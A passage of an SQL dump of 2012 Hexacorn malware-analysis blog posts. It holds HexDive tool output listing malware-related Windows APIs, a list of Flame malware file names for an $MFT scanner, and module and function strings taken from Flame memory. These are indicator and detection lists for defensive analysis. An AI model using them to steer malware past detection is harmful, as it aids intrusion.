'http://www.hexacorn.com/blog/2012/06/07/hexdive-intelligent-string-extractor/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (364, 'Permanent Link to HexDive – Preview of a new tool (2)', 'Hexacorn', 'June 5, 2012 ', 'I thought I will show some more output from the tool – these are malware-specific APIs only (tool outputs more stuff).\natm it’s over 70,000 keywords searched using modified Aho-Corasick algorithm:\nFlame memory dump (partial)\n\nA|mal-api|-|NtQueryInformationProcess\nA|mal-api|-|select\nA|mal-api|-|bind\nA|mal-api|-|WSAAccept\nA|mal-api|-|WSAIoctl\nA|mal-api|-|EnumProcesses\nA|mal-api|-|OpenProcessToken\nA|mal-api|-|OpenThreadToken\nA|mal-api|-|LookupPrivilegeValueW\nA|mal-api|-|AdjustTokenPrivileges\nA|mal-api|-|CreateProcessAsUserW\nA|mal-api|-|ImpersonateLoggedOnUser\nA|mal-api|-|RegCloseKey\nA|mal-api|-|RegSetValueExW\nA|mal-api|-|RegSetValueExA\nA|mal-api|-|GetUserNameA\nA|mal-api|-|CreateProcessWithLogonW\nA|mal-api|-|GetUserNameW\nA|mal-api|-|RasEnumConnectionsW\nA|mal-api|-|NdrClientCall2\nA|mal-api|-|FindWindowA\nA|mal-api|-|WSASend\nA|mal-api|-|WSARecv\nA|mal-api|-|CloseServiceHandle\nA|mal-api|-|DeleteService\nA|mal-api|-|CreateServiceA\nA|mal-api|-|StartServiceA\nA|mal-api|-|ControlService\nA|mal-api|-|CreateThread\nA|mal-api|-|CreateMutexA\nA|mal-api|-|CreateMutexW\nA|mal-api|-|SetEnvironmentVariableW\nA|mal-api|-|VirtualAllocEx\nA|mal-api|-|ReadProcessMemory\nA|mal-api|-|OpenProcess\nA|mal-api|-|Sleep\nA|mal-api|-|WriteFile\nA|mal-api|-|FindFirstFileW\nA|mal-api|-|CreateFileW\nA|mal-api|-|GetModuleHandleW\nA|mal-api|-|GetModuleFileNameW\nA|mal-api|-|GetModuleHandleA\nA|mal-api|-|VirtualProtect\nA|mal-api|-|GetVersion\nA|mal-api|-|GetSystemDirectoryW\nA|mal-api|-|ExitThread\nA|mal-api|-|GetThreadTimes\nA|mal-api|-|GetThreadContext\nA|mal-api|-|OpenThread\nA|mal-api|-|GetProcAddress\nA|mal-api|-|SetThreadContext\nA|mal-api|-|GetTempPathW\nA|mal-api|-|GetTempFileNameW\nA|mal-api|-|GetFileAttributesW\nA|mal-api|-|LoadLibraryW\nA|mal-api|-|CreateProcessW\nA|mal-api|-|DeleteFileW\nA|mal-api|-|MoveFileExW\nA|mal-api|-|Thread32First\nA|mal-api|-|Thread32Next\nA|mal-api|-|CreateToolhelp32Snapshot\nA|mal-api|-|GetTickCount\nA|mal-api|-|FindNextFileW\nA|mal-api|-|CreateNamedPipeW\nA|mal-api|-|DisconnectNamedPipe\nA|mal-api|-|CreateDirectoryW\nA|mal-api|-|LockResource\nA|mal-api|-|GetStartupInfoW\nA|mal-api|-|PeekNamedPipe\nA|mal-api|-|ExitProcess\nA|mal-api|-|FindFirstFileA\nA|mal-api|-|FindNextFileA\nA|mal-api|-|GetComputerNameA\nA|mal-api|-|GetEnvironmentVariableA\nA|mal-api|-|GetTimeZoneInformation\nA|mal-api|-|GetComputerNameW\nA|mal-api|-|CreateNamedPipeA\nA|mal-api|-|CreateProcessA\nA|mal-api|-|GetModuleFileNameA\nA|mal-api|-|GetCommandLineA\nA|mal-api|-|IsDebuggerPresent\nA|mal-api|-|DeleteFileA\nA|mal-api|-|GetStartupInfoA\nA|mal-api|-|FreeEnvironmentStringsA\nA|mal-api|-|FreeEnvironmentStringsW\nA|mal-api|-|GetFileAttributesA\nA|mal-api|-|GetStringTypeA\nA|mal-api|-|GetStringTypeW\nA|mal-api|-|SetEnvironmentVariableA\nA|mal-api|-|DeviceIoControl\nA|mal-api|-|GetSystemDirectoryA\nA|mal-api|-|GetDriveTypeA\nA|mal-api|-|SetThreadPriority\nA|mal-api|-|GetDiskFreeSpaceW\nA|mal-api|-|GetDiskFreeSpaceA\nA|mal-api|-|GetTempPathA\nA|mal-api|-|GetDriveTypeW\nA|mal-api|-|FindFirstChangeNotificationW\nA|mal-api|-|FindNextChangeNotification\nA|mal-api|-|FindFirstVolumeW\nA|mal-api|-|ExitThread\nA|mal-api|-|ExitThread\nU|mal-api|-|SLEEP\nU|mal-api|-|SLEEP\nU|mal-api|-|connect\nU|mal-api|-|LoadLibraryW\nU|mal-api|-|GetComputerNameA\nU|mal-api|-|GetComputerNameW\nU|mal-api|-|GetUserNameA\nU|mal-api|-|GetUserNameW\nU|mal-api|-|connect\nU|mal-api|-|connect\nU|mal-api|-|connect\nU|mal-api|-|connect\nU|mal-api|-|connect\nU|mal-api|-|connect\nU|mal-api|-|DeleteService\nU|mal-api|-|connect\nU|mal-api|-|DeleteService\nU|mal-api|-|connect\nU|mal-api|-|DeleteService\nU|mal-api|-|connect\nU|mal-api|-|DeleteService\nU|mal-api|-|Connect\nU|mal-api|-|connect\nU|mal-api|-|Connect\nU|mal-api|-|SLEEP\nU|mal-api|-|Send\nU|mal-api|-|Send\nU|mal-api|-|Send\nU|mal-api|-|Send\nU|mal-api|-|Send\nU|mal-api|-|Select\nU|mal-api|-|SLEEP\nU|mal-api|-|SLEEP\nU|mal-api|-|SLEEP\nU|mal-api|-|SLEEP\nU|mal-api|-|SLEEP\nU|mal-api|-|Connect\nU|mal-api|-|connect\nU|mal-api|-|connect\nU|mal-api|-|select\nU|mal-api|-|NtQuerySystemInformation\nU|mal-api|-|RegLoadKeyW\nU|mal-api|-|CreateToolhelp32Snapshot\nU|mal-api|-|Process32First\nU|mal-api|-|Process32FirstW\nU|mal-api|-|Process32Next\nU|mal-api|-|Process32NextW\nA|mal-api|-|ExitThread\nA|mal-api|-|Sleep\nA|mal-api|-|VirtualProtect\nA|mal-api|-|GetProcAddress\nA|mal-api|-|GetModuleHandleA\nA|mal-api|-|CreateMutexW\nA|mal-api|-|NtQueryInformationProcess\nA|mal-api|-|LoadLibraryW\nA|mal-api|-|CreateFileW\nU|mal-api|-|GetProcAddress\nU|mal-api|-|GetModuleHandleA\nU|mal-api|-|OpenThread\nU|mal-api|-|ExitThread\nU|mal-api|-|ExitThread\nU|mal-api|-|GetModuleHandleW\nA|mal-api|-|URLDownloadToFileA\nA|mal-api|-|ExitThread\nA|mal-api|-|SELECT\nA|mal-api|-|bind\nA|mal-api|-|bind\nRandom malware sample:\nA|mal-api|-|CreateToolhelp32Snapshot\nA|mal-api|-|Toolhelp32ReadProcessMemory\nA|mal-api|-|Process32Next\nA|mal-api|-|Process32FirstW\nA|mal-api|-|Thread32First\nA|mal-api|-|Thread32Next\nA|mal-api|-|Module32First\nA|mal-api|-|Module32Next\nA|mal-api|-|Module32FirstW\nA|mal-api|-|Module32NextW\nA|mal-api|-|WSAStartup\nA|mal-api|-|WSACleanup\nA|mal-api|-|WSAASyncGetHostByName\nA|mal-api|-|WSAASyncGetServByName\nA|mal-api|-|bind\nA|mal-api|-|listen\nA|mal-api|-|connect\nA|mal-api|-|WSACancelASyncRequest\nA|mal-api|-|closesocket\nA|mal-api|-|send\nA|mal-api|-|recv\nA|mal-api|-|WSACleanup\nA|mal-api|-|accept\nA|mal-api|-|bind\nA|mal-api|-|closesocket\nA|mal-api|-|connect\nA|mal-api|-|ioctlsocket\nA|mal-api|-|htonl\nA|mal-api|-|htons\nA|mal-api|-|inet_addr\nA|mal-api|-|inet_ntoa\nA|mal-api|-|listen\nA|mal-api|-|ntohl\nA|mal-api|-|ntohs\nA|mal-api|-|recv\nA|mal-api|-|recvfrom\nA|mal-api|-|select\nA|mal-api|-|send\nA|mal-api|-|sendto\nA|mal-api|-|setsockopt\nA|mal-api|-|shutdown\nA|mal-api|-|socket\nA|mal-api|-|gethostbyaddr\nA|mal-api|-|gethostbyname\nA|mal-api|-|gethostname\nA|mal-api|-|getservbyname\nA|mal-api|-|WSASetLastError\nA|mal-api|-|WSAAsyncGetServByName\nA|mal-api|-|WSAAsyncGetServByPort\nA|mal-api|-|WSAAsyncGetProtoByName\nA|mal-api|-|WSAAsyncGetProtoByNumber\nA|mal-api|-|WSAAsyncGetHostByName\nA|mal-api|-|WSAAsyncGetHostByAddr\nA|mal-api|-|WSACancelAsyncRequest\nA|mal-api|-|WSAAsyncSelect\nA|mal-api|-|__WSAFDIsSet\nA|mal-api|-|WSAAccept\nA|mal-api|-|WSACloseEvent\nA|mal-api|-|WSAConnect\nA|mal-api|-|WSACreateEvent\nA|mal-api|-|WSAHtonl\nA|mal-api|-|WSAHtons\nA|mal-api|-|WSAIoctl\nA|mal-api|-|WSANtohs\nA|mal-api|-|WSARecv\nA|mal-api|-|WSARecvFrom\nA|mal-api|-|WSASend\nA|mal-api|-|WSASendTo\nA|mal-api|-|WSAWaitForMultipleEvents\nA|mal-api|-|WSAProviderConfigChange\nA|mal-api|-|AcceptEx\nA|mal-api|-|WSARecvEx\nA|mal-api|-|WSAStartup\nA|mal-api|-|ZwQuerySystemInformation\nA|mal-api|-|ZwOpenProcess\nA|mal-api|-|ZwOpenSection\nA|mal-api|-|ZwOpenFile\nU|mal-api|-|connect\nU|mal-api|-|connect\nU|mal-api|-|connect\nU|mal-api|-|connect\nU|mal-api|-|send\nU|mal-api|-|socket\nU|mal-api|-|socket\nU|mal-api|-|socket\nU|mal-api|-|socket\nU|mal-api|-|connect\nU|mal-api|-|connect\nU|mal-api|-|connect\nU|mal-api|-|socket\nU|mal-api|-|socket\nU|mal-api|-|shutdown\nU|mal-api|-|socket\nU|mal-api|-|socket\nU|mal-api|-|listen\nU|mal-api|-|socket\nU|mal-api|-|socket\nU|mal-api|-|socket\nA|mal-api|-|GetProcAddress\nA|mal-api|-|GetModuleHandleA\nA|mal-api|-|InternetReadFile\nA|mal-api|-|StartServiceA\nA|mal-api|-|WSACleanup\nA|mal-api|-|WSAIoctl\nShare this :)', 'HexDive, Malware Analysis, Software Releases', 'http://www.hexacorn.com/blog/2012/06/05/hexdive-preview-of-a-new-tool-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (365, 'Permanent Link to HexDive – Preview of a new tool', 'Hexacorn', 'June 3, 2012 ', 'tl; dr; reduces time needed for strings review by extracting selected strings from analyzed samples omitting lots of junk seen in an output of a typical strings tool + as a bonus gets these strings classified\nHexDive is a new toy of mine. I liked the way HAPI worked, but always planned to write something a bit smarter than just exporting known APIs from the analyzed files. HAPI was actually a first test of the idea that I had for a very long time, yet my ongoing research has not been completed by the time I wrote it. What I wanted to write was a tool that generates output that can immediately give an analyst a power to classify file functionality on the spot. This may also help automation that can be driven by cherry picked known-strings from the analyzed file. It may (and hopefully will) help a lot with batch analysis.\nExisting, similar projects exist of course, but  their databases are very small. More advanced projects are usually private (AV companies use them). In order to do it right, a large database of good malware-related and good keywords is needed. This can’t be obtained easily as there are literally tones of samples and each contains lots of strings. So, one needs to be selective and decide what strings exported from a sample or a memory dump are the good ones (or bad ones). Often, dynamic analysis is needed with a process instrumentation helping in picking up interesting stuff. This is tough and it took me over a year of collecting different artifacts from 250000 unique samples as well as taking notes from various places on the web or my own system. My notes file contains now lots of data and I am slowly working through it. And just to be clear, the data I am looking for are not file names of known malware, but the stuff that is common amongst malware files – registry keys, etc.\nI am finishing the testing and there is a lot of work of updating precompiled foriests of tries (no, it’s not a typo :), but am already happy to present an excerpt from the output from the first beta version. First public version of a tool will be published within a week or so.\n--------------------------------------------------------------\r\n  hexdive v0.1 (c) Hexacorn 2012. All rights reserved.\r\n  Visit us at http://www.hexacorn.com\r\n--------------------------------------------------------------\nA|ACL|Privileges|SeDebugPrivilege\r\nA|Environment variable|User Profile|%USERPROFILE%\r\nA|Directory|Program Files directory (32-bit)|Program Files\r\nA|Interesting keywords|-|Explorer\r\nA|api|generic|RtlAnsiStringToUnicodeString\r\nA|anti-routine|process name|avp.exe\r\nA|ACL|Privileges|SeDebugPrivilege\r\nA|Interesting keywords|-|Userinit\r\nA|IRC|-|PING\r\nA|IRC|-|PONG\r\nA|IRC|-|JOIN\r\nA|Placeholder|IP|%d.%d.%d.%d\r\nA|Environment variable|Date|%date%\r\nA|File Extension|-|.com\r\nU|anti-routine|process name|avp.exe\r\nU|File Extension|-|.exe\r\nU|Interesting keywords|-|desktop.ini\nShare this :)', 'HexDive, Malware Analysis, Software Releases', 'http://www.hexacorn.com/blog/2012/06/03/hexdive-preview-of-a-new-tool/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (366, 'Permanent Link to $MFT scanning for fun and err… Flame', 'Hexacorn', 'May 31, 2012 ', 'Update 2012-July\nExpect this tool to grow over next couple of months.\nOld Post\nI was toying around with $MFT parsing and came up with a simple demo tool that parses $MFT looking for remnants of malware. Tool is written in x86 assembly so I guess it is forensically sound \nAt the moment it only scans for flame malware (I used list from all the places I could find including my own research, CrySyS Lab, Kaspersky, BitDefender, malware.lu, kernelmode.info, etc. –  list pasted below).\nIt should find entries that are both live (existing files) and deleted entries.\nThis is how it works – if it is bad news for you:\n \n\nNote: this is an experimental tool – DO NOT test it on production system. You can always use fls.exe from sleuthkit.\nThe tool can be downloaded here.\nThis is a list of files it searches for:\n\nadvnetcfg.ocx\nAdvpck.dat\naudache\naudfilter.dat\nauthcfg.dat\nauthpack.ocx\nboot32drv.sys\nbrowse32.ocx\nccalc32.sys\ncmutlcfg.ocx\ncommgr32\ncomspol32.dll\ncomspol32.ocx\ncontents.btr\nctrllist.dat\ndcomm.dat\ndesc.ini\ndmmsapi.dat\ndsmgr.ocx\ndstrlog.dat\nEf_trace.log\nfib32.bat\nfrog.bat\ngppref32.exe\ngrb9m2.bat\nguninst32\nindsvc32.ocx\nlib.ocx\nlmcache.dat\nlss.ocx\nm4aaux.dat\nmodevga.com\nmprhlp\nMSAPackages\nMSAudio\nMSAuthCtrl\nmscrypt.dat\nmsglu32.ocx\nmssecmgr.ocx\nMSSecurityMgr\nMSSndMix\nmssui.drv\nmssvc32.ocx\nnetcfgi.ocx\nntaps.dat\nnteps32\nnteps32.ocx\nPcldrvx.ocx\nrdcvlt32.exe\nRpcnc.dat\nrpcns4.ocx\nscaud32.exe\nscsec32.exe\nsdclt32.exe\nsecindex.dat\nsoapr32.ocx\nssitable\nstamn32\nsvchost1ex.mof\nSvchostevt.mof\ntarget.lnk\nto961.tmp\nurpd.ocx\nwatchxb.sys\nwavesup3.drv\nwinconf32.ocx\nwinrt32.dll\nwinrt32.ocx\nwlndh32\nWpab32.bat\nwpgfilter.dat\nwrm3f0\nzff042\n~8C5FF6C.tmp\n~a29.tmp\n~d43a37b.tmp\n~DEB83C.tmp\n~DEB93D.tmp\n~DF05AC8.tmp\n~dfc855.tmp\n~DFD85D3.tmp\n~DFL*.tmp\n~DFL983.tmp\n~dra*.tmp\n~dra52.tmp\n~dra53.tmp\n~f28.tmp\n~fghz.tmp\n~HLV\n~HLV*.tmp\n~KWI\n~KWI988.tmp\n~KWI989.tmp\n~mso2a0.tmp\n~mso2a1.tmp\n~mso2a2.tmp\n~nms534\n~rcf0\n~rcj0\n~rei524.tmp\n~rei525.tmp\n~rf288.tmp\n~rft374.tmp\n~TFL848.tmp\n~TFL849.tmp\n~ZLM0D1.ocx\n~ZLM0D2.ocx\n\n \nShare this :)', 'Compromise Detection, Forensic Analysis, HCD, Malware Analysis, Software Releases', 'http://www.hexacorn.com/blog/2012/05/31/mft-scanning-for-fun-and-err-flame/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (367, 'Permanent Link to Quick look at…', 'Hexacorn', 'May 29, 2012 ', 'Update\nKaspersky has a short description of all module here.\nOld post\nEveryone is jumping on the you know what   malware, so I had a quick look as well and pasted some bits and pieces on pastebin (here and here) and after poking around a bit more and cleaning up the strings output came up with the small list of ‘module’ and ‘functions’ names that suggest the functionality, as well as other strings.\nQuick dynamic analysis confirm that there are 4 timestomped (2004-Aug-04) encrypted files created on the system if NONE of the security software processes (see down below) are running:\n\nc:\\Program Files\\Common Files\\Microsoft Shared\\MSSecurityMgr\\lmcache.dat\nc:\\Program Files\\Common Files\\Microsoft Shared\\MSSecurityMgr\\mscrypt.dat\nc:\\Program Files\\Common Files\\Microsoft Shared\\MSSecurityMgr\\ntcache.dat\nc:\\Program Files\\Common Files\\Microsoft Shared\\MSSecurityMgr\\rccache.dat\n\nThe strings below have been extracted from memory after executing the DDEnumCallback function and then let it go for a while.\nIt includes:\n\nassumed module names\nassumed module functions\nlist of security software-related strings\nother strings from memory dumps\n\nQuite frankly, it all does look a bit like a prank – see it yourself… BUNNY, EUPHORIA, DRILLER, HEADACHE, SUICIDE, VIPER, etc.\nList of Modules\n\nA\nAUTORUN\nBEETLEJUICE\nBOOST\nBOOT_DLL_LOADER\nBUNNY\nCMDROUTER\nCMDS\nCOMEXPS\nCOMSVCS\nCRUISE\nDBQUERY\nDRILLER\nEUPHORIA\nFBS\nFROG\nGADGET\nGATOR\nHEADACHE\nINSTALL\nLEAK\nLIMBO\nLOG\nLUA\nMEMORY\nMICROBE\nMOBILE\nMUNCH\nP_CMDS\nPROCSUPPLIER\nQC\nRTS\nS\nSECURITY\nSNACK\nSTORAGE\nSUICIDE\nTELEMETRY\nTIMER\nUSB_SUPPLIER\nVIPER\nVOLUME_SUPPLIER\nWEASEL\n\nList of functions/methods:\n\nA.CLAN.CRED_HANDLERS.USERPASS\nA.CLAN.EXECS\nA.CLAN.SAFETIES\nA.CLAN.SCEN.FLASK_STG_PRIORITY\nA.CLAN.SCEN.MAX_FLAME_AT_ONCE\nA.CLAN.SCEN.SLEEP_BETWEEN_ATTACKS\nA.CLAN.SUCCESS_HANDLERS.JIMMY\nA.CLAN.THREATENING_PROGRAMS\nA.CLAN.THREATENING_PROGRAMS.LOCAL\nA.CLAN.THREATENING_PROGRAMS.LOCAL.CRED\nA.CLAN.THREATENING_PROGRAMS.LOCAL.CRED.AUDITION.1.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.CRED.AUDITION.size\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.1.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.1.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.1.prev\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.10.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.10.prev\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.11.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.12.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.12.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.13.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.13.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.14.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.14.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.15.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.16.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.17.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.18.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.18.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.19.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.19.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.2.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.2.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.2.prev\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.20.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.20.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.21.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.21.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.22.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.22.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.23.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.23.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.24.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.24.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.25.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.25.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.25.prev\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.26.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.26.prev\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.27.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.27.prev\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.28.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.28.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.28.prev\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.29.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.29.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.29.prev\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.3.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.3.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.3.prev\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.30.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.30.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.31.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.31.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.31.prev\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.32.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.32.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.32.prev\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.34.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.34.data.SHOULD_FILTER\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.34.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.34.prev\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.35\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.35.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.35.prev\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.36.prev\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.37.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.37.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.37.prev\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.38.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.38.data.SHOULD_FILTER\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.38.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.38.prev\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.39.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.39.prev\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.4.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.4.data.SHOULD_FILTER\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.4.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.4.prev\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.40.data.SHOULD_FILTER\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.40.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.40.prev\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.41.data.NAME\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.41.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.41.prev\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.42.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.43.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.43.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.5.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.5.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.5.prev\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.6.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.6.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.6.prev\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.7.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.7.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.8.data\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.8.data.SHOULD_FILTER\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.8.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.8.prev\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.9.data.SHOULD_FILTER\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.9.next\nA.CLAN.THREATENING_PROGRAMS.LOCAL.EXEC.WMI.9.prev\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.1.data\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.1.next\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.10.data\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.11.data\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.11.next\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.12.data\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.12.next\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.13.data\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.13.next\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.13.prev\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.14.data\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.14.next\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.14.prev\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.15\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.15.data\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.15.next\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.16.data\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.16.next\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.17.data\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.17.next\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.18.data\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.18.data.NAME\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.18.next\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.19.data\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.19.next\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.2.data\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.2.next\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.2.prev\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.20.data\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.20.next\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.21\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.21.data\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.21.next\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.22.next\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.22.prev\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.23.next\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.23.prev\nA.CLAN.THREATENING_PROGRAMS.REMOTE.EXEC.RESCH.24.next\nA.CLAN.THREATENING_PROGRAMS.